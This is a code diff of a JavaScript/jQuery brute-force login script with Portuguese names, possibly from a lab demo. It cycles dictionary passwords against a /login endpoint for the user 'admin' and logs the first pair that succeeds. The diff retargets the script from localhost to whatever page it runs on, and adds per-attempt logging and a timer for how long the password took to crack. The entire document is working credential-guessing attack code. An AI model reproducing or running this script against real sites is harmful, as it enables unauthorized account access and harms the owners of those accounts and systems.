@@ -3,22 +3,27 @@ adicionarSenha(0,'admin');  //Inicio
 // adicionarSenha(2,'admin');  //Fim
 
 const dicionario = {
-    logins: ['UsuarioX'],
+    logins: ['admin'],
     senhas: senhas
 };
 
 let data = {};
+let times = {
+    start: Date.now(),
+    end: 0
+}
 
-const base = 'localhost';
-const urlAlvo = `http://${base}:4343/login`;
+const url =  window.location.origin || 'http://localhost:4343';
+const urlAlvo = `${url}/login`;
 
-let l = 0, s = 0;
+let login = 0, pwd = 0;
 let count = 0;
 sendAjax();
 function sendAjax() {
     count++;
-    data.login = dicionario.logins[l];
-    data.senha = dicionario.senhas[s];
+    data.login = dicionario.logins[login];
+    data.senha = dicionario.senhas[pwd];
+    console.log(`Tentativa nº ${count} :::: Testando senha: '${data.senha}'  `);
     $.ajax({
         url: urlAlvo,
         type: 'POST',
@@ -27,22 +32,19 @@ function sendAjax() {
         contentType: "application/json; charset=utf-8",
         statusCode: {
             200: () => {
-                bad = false;
                 let user = {};
-                user.login = dicionario.logins[l];
-                user.senha = dicionario.senhas[s];
-                endFB(user);
+                user.login = dicionario.logins[login];
+                user.senha = dicionario.senhas[pwd];
+                endFB({user});
             },
             401: () => {
-                if (l+1 >= dicionario.logins.length && s+1 >= dicionario.senhas.length) {
+                if (login+1 >= dicionario.logins.length && pwd+1 >= dicionario.senhas.length) {
                     endFB({user:"Não encontrado"});
                 } else {
-                    l++;
-                    if (l >= dicionario.logins.length) {
-                        l = 0;
-                        s++;
-                        if (s >= dicionario.senhas.length) {
-                            s = 0;
+                    if (++login >= dicionario.logins.length) {
+                        login = 0;
+                        if (++pwd >= dicionario.senhas.length) {
+                            pwd = 0;
                         }
                     }
                     sendAjax();
@@ -52,6 +54,8 @@ function sendAjax() {
     });
 }
 
-function endFB(login) {
-    console.log({ loginEncontrado: login });
+function endFB(user) {
+    console.log({ loginEncontrado: user });
+    times.end = Date.now();
+    console.log('Milissegundos para quebrar a senha:',times.end-times.start);
 }
